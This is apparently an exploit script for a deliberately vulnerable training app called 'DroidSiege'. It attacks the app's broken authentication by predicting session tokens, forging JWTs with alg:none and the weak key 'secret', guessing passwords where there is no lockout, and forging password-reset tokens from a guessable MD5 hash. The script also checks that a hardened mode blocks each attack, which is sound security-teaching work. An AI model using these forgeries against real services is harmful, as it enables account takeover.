#!/usr/bin/env python3
"""DroidSiege — backend/brokenauth exploit script (all four tiers, vuln + hardened).

Usage: python3 brokenauth_attacks.py [base_url]
Default base: http://10.0.2.2:8080 (emulator -> host loopback). For hardened
verification start the backend with SECURE_MODE=on and re-run: every exploit
must FAIL (401/403/429, no flag).
"""
import hashlib, json, sys, urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://10.0.2.2:8080").rstrip("/")

def call(method, path, token=None, body=None):
    req = urllib.request.Request(BASE + path, method=method)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, data=data) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def login(u, p):
    status, body = call("POST", "/api/auth/login", body={"username": u, "password": p})
    assert status == 200, f"login failed: {{status}} {{body}}"
    return json.loads(body)["token"]


import base64, hmac

def b64u(raw):
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

def main():
    print("== L1: predict bob's token (sess-1000+userId) without logging in ==")
    print(call("GET", "/api/auth/whoami", "sess-1002"))

    print("== L2: alg:none forgery — no signature at all ==")
    none_token = b64u(b'{"alg":"none","typ":"JWT"}') + "." + b64u(b'{"sub":9,"role":"admin"}')
    print(call("GET", "/api/auth/jwt/verify?token=" + none_token))

    print("== L2b: HS256 forgery with the weak secret 'secret' ==")
    signing_input = b64u(b'{"alg":"HS256","typ":"JWT"}') + "." + b64u(b'{"sub":9,"role":"admin"}')
    sig = b64u(hmac.new(b"secret", signing_input.encode(), hashlib.sha256).digest())
    print(call("GET", "/api/auth/jwt/verify?token=" + signing_input + "." + sig))

    print("== L3: no lockout — six wrong attempts then the right password ==")
    for _ in range(6):
        call("POST", "/api/auth/login", body={"username": "svcadmin", "password": "wrong"})
    print(call("POST", "/api/auth/login", body={"username": "svcadmin", "password": "123456"}))

    print("== L4: reset token = md5('droidsiege'+user)[:8], never expires ==")
    call("POST", "/api/auth/forgot", body={"username": "bob"})
    guessed = hashlib.md5(b"droidsiegebob").hexdigest()[:8]
    print(call("POST", "/api/auth/reset",
               body={"username": "bob", "token": guessed, "newPassword": "pwned123"}))

if __name__ == "__main__":
    main()
